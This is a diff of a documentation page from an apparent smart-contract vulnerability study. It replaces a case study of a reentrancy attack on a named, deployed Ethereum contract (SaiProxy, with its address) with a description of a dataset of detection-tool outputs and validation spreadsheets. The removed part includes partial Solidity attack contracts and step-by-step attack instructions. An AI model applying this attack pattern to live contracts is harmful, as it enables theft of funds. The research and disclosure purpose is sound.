@@ -1,95 +1,48 @@
-#################################################
-Evaluations and Analysis on 76354 Smart Contracts
-#################################################
+Supplement Materials
+####################
 
-**Contract Name**
+In this section, we provide concrete information about vulnerable code which is reported by tools. The locations of vulnerable code, our validation results, tools which reported this code are given.
 
-SaiProxy
+Please download our data on `this <https://drive.google.com/file/d/1k0Edw2r1Z59WBc8SFbeh85hJMydGNPGz/view?usp=sharing>`_. The structure of our data is managed like:
 
-**Contract Address**
-
-0x526af336D614adE5cc252A407062B8861aF998F5
-
-**Transaction Count**
-
-9987
-
-**Invovled Ethers**
-
-107172.49 Ethers
-
-**Length of the Call Chain**
-
-4 external function
-
-**Victim Function**
-
-``lock``
-
-**Attack Mechanisim**
-
-Attack code:
 ::
 
-    contract TubInterface {
-        constructor() payable {}
-        SaiProxy s;
-        address victim;
-        bytes32 temp;
-        address gemp;
-        function setVictim(address _addr, address _gem) {
-            s = SaiProxy(_addr);
-            victim = _addr;
-            gemp = _gem;
-        }
-        ...
-        function cups(bytes32 cup) public returns (address, uint, uint, uint){
-            return (victim, 0, 0, 0);
-        }
-        function gem() public view returns (TokenInterface){
-            return(TokenInterface(gemp));
-        }
-        ...
-    }
+    +---outputs
+    |   +---doublade
+    |   |       doublade_lowlevelcall_output.log
+    |   |       doublade_reentrancy_output.log
+    |   |       doublade_selfdestruct_output.log
+    |   |       doublade_tx_output.log
+    |   |       doublade_unexpectedrevert_output.log
+    |   |
+    |   +---oyente
+    |   +---securify
+    |   +---slither
+    |   \---smartcheck
+    +---source_code
+    |	address.xlsx
+    \---validation_results
+    |   doublade_lowlevelcall_result.xlsx
+    |   doublade_reentrancy.xlsx
+    |   doublade_selfdestruct_result.xlsx
+    |   doublade_tx_result.xlsx
+    |   doublade_unexpectedrevert_result.xlsx
+    |   oyente_reentrancy.xlsx
+    |   securify_reentrancy.xlsx
+    |   slither_lowlevelcall_result.xlsx
+    |   slither_reentrancy.xlsx
+    |   slither_selfdestruct_result.xlsx
+    |   slither_tx_result.xlsx
+    |   slither_unexpectedrevert_result.xlsx
+    |   smartcheck_lowlevelcall_result.xlsx
+    |   smartcheck_tx_result.xlsx
+    |   smartcheck_unexpectedrevert_result.xlsx
+    |
 
-    contract TokenInterface {
-        bytes32 temp;
-        address tubbb;
-        SaiProxy s;
-        TubInterface tub = new TubInterface();
-        function setVictim(address _addr, address _tub) {
-            s = SaiProxy(_addr);
-            tubbb = _tub;
-        }
-        constructor() payable {}
-        ...
-        function deposit() public payable{
-            s.lock.value(1 ether)(tubbb, temp);
-                //s.open(this);
-        }
-        ...
-    }
 
-Attacked code:
-::
+Original Solidity code are putted is folder ``source_code``. The files are not named with their deployment addresses, rather, we renamed them for experiment convenience. We also provide the address table ``address.xlsx`` where you can match file names with real addresses.
 
-    contract SaiProxy is DSMath {
-        ...
-        function lock(address tub_, bytes32 cup) public payable {
-            if (msg.value > 0) {
-                TubInterface tub = TubInterface(tub_);
+In folder ``outputs``, we grouped raw vulnerability detection reports by tools. And the validation results are included in folder `validation_results`. 
 
-                (address lad,,,) = tub.cups(cup);
-                require(lad == address(this), "cup-not-owned");
+Please combine validation results with source code and raw outputs. For further, if you want to look up the value involved in code, you can find addresses by matching file names in `address.xlsx` and search them in `Etherscan <https://etherscan.io/>`_ for details.
 
-                tub.gem().deposit.value(msg.value)();
-                ...
-            }
-        }
-    }
-
-In this case, the goal of our reentrancy is ``tub.gem().deposit.value(msg.value)();`` in the victim code. To reach our goal we need pass three conditions. Firstly we need to make sure the *msg.value* is greater than 0. Next we need to declare a new ``TuberInterface`` instance and call its ``cups`` function to return a address to the variable ``lad``. Last, we need to make sure the address stored in `lad` equals to the address of the victim contract.
-
-**Preparation.** We call ``setVictim`` function in attack code to set the address of victim code to the variable ``_addr`` and set the address of the other attack contract ``TokenInterface`` to ``_gem``. Next we call the other ``setVictim`` function in contract ``TokenInterface`` then set the address of victim code to ``_addr`` and set ``tubbb`` an address the same as ``_addr``. 
-
-**Attack.** The attacker call `deposit` function, it calls ``lock`` function in victim contract.  The ``if`` condition is satisfied because we our call is appended by ``.value``. Next, the contract initialize  an instance of the contract ``TubInterface`` and call ``cup`` to get the address. Unfortunately, the function involved in this attack is well manipulated and we won't let it fail. Then the contract checks whether the ``lad`` equals to the address of the victim contract. It doesn't work. We finally get to the key statement ``tub.gem().deposit`` which calls back to the `gem` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
